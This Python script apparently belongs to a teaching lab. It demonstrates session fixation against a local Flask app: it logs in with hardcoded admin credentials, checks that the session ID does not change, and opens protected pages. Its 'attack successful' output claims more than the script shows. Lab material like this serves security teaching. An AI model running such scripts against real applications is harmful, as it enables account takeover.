#!/usr/bin/env python3
"""
Session Fixation Attack Demo Script
This script demonstrates how to exploit the session fixation vulnerability
"""

import requests
import re
from urllib.parse import urljoin

class SessionFixationDemo:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def get_session_id(self):
        """Get a session ID before login"""
        print("🔍 Step 1: Getting session ID before login...")
        response = self.session.get(urljoin(self.base_url, "/login"))
        
        # Extract session ID from cookies
        session_cookie = self.session.cookies.get('session')
        print(f"📋 Session ID: {session_cookie}")
        return session_cookie
    
    def login_with_session(self, username="admin", password="admin123"):
        """Login using the existing session (vulnerability)"""
        print(f"\n🔐 Step 2: Logging in as {username}...")
        
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(
            urljoin(self.base_url, "/login"),
            data=login_data
        )
        
        # Check if login was successful
        if "Login successful" in response.text:
            print("✅ Login successful!")
            print(f"📋 Session ID after login: {self.session.cookies.get('session')}")
            return True
        else:
            print("❌ Login failed!")
            return False
    
    def access_protected_area(self, path="/admin"):
        """Access a protected area using the session"""
        print(f"\n🚪 Step 3: Accessing protected area: {path}")
        
        response = self.session.get(urljoin(self.base_url, path))
        
        if response.status_code == 200:
            print("✅ Successfully accessed protected area!")
            
            # Check if we can see admin content
            if "Admin Panel" in response.text:
                print("🎯 ADMIN ACCESS GRANTED!")
            elif "Profile" in response.text:
                print("👤 User profile accessed!")
            
            return True
        else:
            print(f"❌ Failed to access {path}")
            return False
    
    def demonstrate_hijacking(self):
        """Demonstrate session hijacking by using the same session ID"""
        print("\n" + "="*50)
        print("🎭 SESSION FIXATION ATTACK DEMONSTRATION")
        print("="*50)
        
        # Step 1: Get session ID
        session_id = self.get_session_id()
        
        # Step 2: Login (session ID should remain the same)
        if self.login_with_session():
            print(f"\n⚠️  VULNERABILITY: Session ID didn't change after login!")
            print(f"   Before login: {session_id}")
            print(f"   After login:  {self.session.cookies.get('session')}")
            
            # Step 3: Access admin panel
            self.access_protected_area("/admin")
            
            # Step 4: Access user profile
            self.access_protected_area("/profile")
            
            print("\n" + "="*50)
            print("🎯 ATTACK SUCCESSFUL!")
            print("="*50)
            print("The attacker can now:")
            print("- Access the user's account")
            print("- View private information")
            print("- Perform actions as the user")
            print("- Access admin functions (if user is admin)")
            
        else:
            print("❌ Attack failed - login unsuccessful")

def main():
    print("🚀 Starting Session Fixation Attack Demo...")
    print("Make sure the Flask app is running on http://localhost:5000")
    print()
    
    demo = SessionFixationDemo()
    
    try:
        demo.demonstrate_hijacking()
    except requests.exceptions.ConnectionError:
        print("❌ Error: Could not connect to the Flask application.")
        print("   Make sure the app is running with: python app.py")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main() 